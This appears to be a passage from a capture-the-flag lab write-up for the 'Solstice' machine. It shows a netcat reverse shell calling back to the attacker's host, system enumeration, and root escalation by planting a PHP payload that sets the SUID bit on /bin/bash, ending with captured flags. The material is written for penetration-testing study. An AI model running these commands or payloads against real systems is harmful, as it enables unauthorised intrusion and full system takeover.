root@kali:/OSCPv3/offsec_pg/Solstice# nc -lvnp 4444
                                                   reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@solstice:/var/tmp/webserver$ export TERM=xterm
www-data@solstice:/var/tmp/webserver$ export SHELL=bash
www-data@solstice:/var/tmp/webserver$ stty rows 24 columns 144
www-data@solstice:/var/tmp/webserver$ 
```

```console
www-data@solstice:/var/tmp$ cd ftp
www-data@solstice:/var/tmp/ftp$ ls
pub
www-data@solstice:/var/tmp/ftp$ cd pub
www-data@solstice:/var/tmp/ftp/pub$ ls
www-data@solstice:/var/tmp/ftp/pub$ cd ..
www-data@solstice:/var/tmp/ftp$ cd ..
www-data@solstice:/var/tmp$ ls -la ftp/pub/
total 8
drws------ 2 www-data www-data 4096 Jun 17  2020 .
drws------ 3 www-data www-data 4096 Jun 17  2020 ..
www-data@solstice:/var/tmp$ ls -la fake_ftp/script.py 
-rw-r--r-- 1 www-data www-data 769 Jun 25  2020 fake_ftp/script.py
```

```console
www-data@solstice:~$ ls
html  local.txt
www-data@solstice:~$ cat local.txt 
35b8d0a12270cb772b8578ee95172f80
``` 

# Privilege escalation


```console
www-data@solstice:/home/miguel$ ls -la
total 32
drwxr-xr-x 4 miguel miguel 4096 Aug  7  2020 .
drwxr-xr-x 3 root   root   4096 Jun 13  2020 ..
lrwxrwxrwx 1 root   root      9 Jun 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 miguel miguel  220 Jun 13  2020 .bash_logout
-rw-r--r-- 1 miguel miguel 3526 Jun 13  2020 .bashrc
drwx------ 3 miguel miguel 4096 Aug  7  2020 .gnupg
drwxr-xr-x 3 miguel miguel 4096 Jun 13  2020 .local
-rw-r--r-- 1 miguel miguel  807 Jun 13  2020 .profile
-rw------- 1 miguel miguel   32 Aug 13  2020 user.txt
```

```console
www-data@solstice:/home/miguel$ sudo -l
sudo: unable to resolve host solstice: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
....
```

```console
www-data@solstice:/home/miguel$ find / -perm -u=s -type f 2>/dev/null
/var/log/exim4/mainlog.1
/var/log/apache2/error.log.1
/var/log/apache2/access.log.1
/var/log/apache2/other_vhosts_access.log
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/pkexec
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/uncompress.so
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```console
www-data@solstice:/home/miguel$ ls -la /etc/passwd
-rw-r--r-- 1 root root 2068 Jun 17  2020 /etc/passwd
www-data@solstice:/home/miguel$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1226 Aug 13  2020 /etc/shadow
``` 

```console
www-data@solstice:/media$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```console
www-data@solstice:/media$ netstat -alnp | more
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:54787           0.0.0.0:*               LISTEN      497/php             
tcp        0      0 0.0.0.0:2121            0.0.0.0:*               LISTEN      498/python          
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8593            0.0.0.0:*               LISTEN      496/php             
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3128            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:57            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:62524           0.0.0.0:*               LISTEN      499/python          
tcp        0    129 192.168.135.72:46974    192.168.49.135:4444     ESTABLISHED 1743/sh             
tcp        0      0 192.168.135.72:8593     192.168.49.135:51818    ESTABLISHED 496/php             
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:34482           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:43192           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
www-data@solstice:/media$ mysql 
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
www-data@solstice:/media$ mysql -u root -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
www-data@solstice:/media$ 
```

```console
www-data@solstice:/home/miguel$ ps -aux | more
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  1.0 169608 10344 ?        Ss   09:56   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    09:56   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   09:56   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   09:56   0:00 [rcu_par_gp]
....
....
root       479  0.0  0.2   9416  2500 ?        S    09:56   0:00 /usr/sbin/CRON -f
root       480  0.0  0.2   9416  2500 ?        S    09:56   0:00 /usr/sbin/CRON -f
root       481  0.0  0.2   9416  2500 ?        S    09:56   0:00 /usr/sbin/CRON -f
www-data   487  0.0  0.0   2388   752 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/python -m pyftpdlib -p 2121 -d /var/tmp/ftp/
root       488  0.0  0.0   2388   756 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516
af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/
root       489  0.0  0.0   2388   756 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
www-data   490  0.0  0.0   2388   756 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/php -S 0.0.0.0:54787 -t /var/tmp/webserver_2/
www-data   491  0.0  0.0   2388   760 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/python /var/tmp/fake_ftp/script.py
www-data   492  0.0  0.0   2388   756 ?        Ss   09:56   0:00 /bin/sh -c /usr/bin/php -S 0.0.0.0:8593 -t /var/tmp/webserver/
avahi      494  0.0  0.0   8156   320 ?        S    09:56   0:00 avahi-daemon: chroot helper
root       495  0.0  1.5  24304 15244 ?        S    09:56   0:00 /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090
e62f66f41b547b75973f9d516af -d /root/ftp/
www-data   496  0.0  2.1 196936 22048 ?        S    09:56   0:00 /usr/bin/php -S 0.0.0.0:8593 -t /var/tmp/webserver/
www-data   497  0.0  2.0 196744 21056 ?        S    09:56   0:00 /usr/bin/php -S 0.0.0.0:54787 -t /var/tmp/webserver_2/
www-data   498  0.0  1.5  24304 15304 ?        S    09:56   0:00 /usr/bin/python -m pyftpdlib -p 2121 -d /var/tmp/ftp/
www-data   499  0.0  0.8  19148  8392 ?        S    09:56   0:00 /usr/bin/python /var/tmp/fake_ftp/script.py
`root       500  0.0  2.0 196744 21144 ?        S    09:56   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/`
root       528  0.0  1.0 184972 10628 ?        Ssl  09:56   0:00 /usr/sbin/cups-browsed
root       529  0.0  0.1   5612  1488 tty1     Ss+  09:56   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       535  0.0  0.6  15852  6660 ?        Ss   09:56   0:00 /usr/sbin/sshd -D
root       609  0.0  2.0 199492 20532 ?        Ss   09:56   0:00 /usr/sbin/apache2 -k start
www-data   645  0.0  1.0 199840 10408 ?        S    09:56   0:00 /usr/sbin/apache2 -k start
www-data   646  0.0  1.1 199848 11924 ?        S    09:56   0:00 /usr/sbin/apache2 -k start
www-data   647  0.0  1.1 199848 11716 ?        S    09:56   0:00 /usr/sbin/apache2 -k start
www-data   648  0.0  1.1 199848 11716 ?        S    09:56   0:00 /usr/sbin/apache2 -k start
www-data   649  0.0  1.2 200020 12120 ?        S    09:56   0:00 /usr/sbin/apache2 -k start
root       665  0.0  1.0  73924 10616 ?        Ss   09:56   0:00 /usr/sbin/squid -sYC
mysql      719  0.0  8.2 1254424 83568 ?       Ssl  09:56   0:01 /usr/sbin/mysqld
Debian-+  1076  0.0  0.3  22120  3868 ?        Ss   09:56   0:00 /usr/sbin/exim4 -bd -q30m
root      1115  0.0  0.7  29076  7968 ?        Ss   09:56   0:00 /usr/sbin/cupsd -l
lp        1117  0.0  0.6  19116  6308 ?        S    09:56   0:00 /usr/lib/cups/notifier/dbus dbus://
proxy     1469  0.0  2.2  79448 23208 ?        S    09:58   0:00 (squid-1) --kid squid-1 -sYC
proxy     1470  0.0  0.1   5504  1680 ?        S    09:58   0:00 (logfile-daemon) /var/log/squid/access.log
www-data  1742  0.0  0.0   2388   696 ?        S    10:15   0:00 sh -c nc 192.168.49.135 4444 -e /bin/sh
www-data  1743  0.0  0.0   2388   696 ?        S    10:15   0:00 sh
www-data  1745  0.0  0.2   5556  2312 ?        S    10:16   0:00 script /dev/null -c bash
www-data  1746  0.0  0.0   2388   696 pts/0    Ss   10:16   0:00 sh -c bash
www-data  1747  0.0  0.3   6992  3764 pts/0    S    10:16   0:00 bash
root      1805  0.0  0.0      0     0 ?        I    10:25   0:00 [kworker/u2:2-events_unbound]
root      1865  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/0:2-ata_sff]
root      1921  0.0  0.0      0     0 ?        I    10:43   0:00 [kworker/0:1-ata_sff]
root      1940  0.0  0.0      0     0 ?        I    10:48   0:00 [kworker/0:0-events]
www-data  1943  0.0  0.3  10916  3252 pts/0    R+   10:53   0:00 ps -aux
www-data  1944  0.0  0.0   5492   832 pts/0    S+   10:53   0:00 more
```

```console
www-data@solstice:/tmp$ cd /var/tmp/sv/
www-data@solstice:/var/tmp/sv$ ls
index.php
www-data@solstice:/var/tmp/sv$ more index.php 
<?php
echo "Under construction";
?>
www-data@solstice:/var/tmp/sv$ 
```

```console
www-data@solstice:/var/tmp/sv$ echo "<?php system('chmod u+s /bin/bash'); ?>" > index.php
www-data@solstice:/var/tmp/sv$ cat index.php 
<?php system('chmod u+s /bin/bash'); ?>
www-data@solstice:/var/tmp/sv$ curl localhost:57
www-data@solstice:/var/tmp/sv$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
www-data@solstice:/var/tmp/sv$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
```

```console
bash-5.0# ls
ftp  proof.txt	root.txt
bash-5.0# cat proof.txt 
a59cc2201bfb655b574bada9a7f23340
bash-5.0#
```

```console
bash-5.0# ls -la
total 16
drwsrwxrwx 2 root     root     4096 Nov 18 11:04 .
drwxrwxrwt 9 root     root     4096 Nov 18 11:09 ..
-rwxrwxrwx 1 root     root       40 Nov 18 11:11 index.php
-rwxrwxrwx 1 www-data www-data   26 Nov 18 11:04 shellroot.php
bash-5.0# cat index.php 
<?php system('chmod u+s /bin/bash'); ?>
bash-5.0# 
```

### References

https://www.hackingarticles.in/apache-log-poisoning-through-lfi/




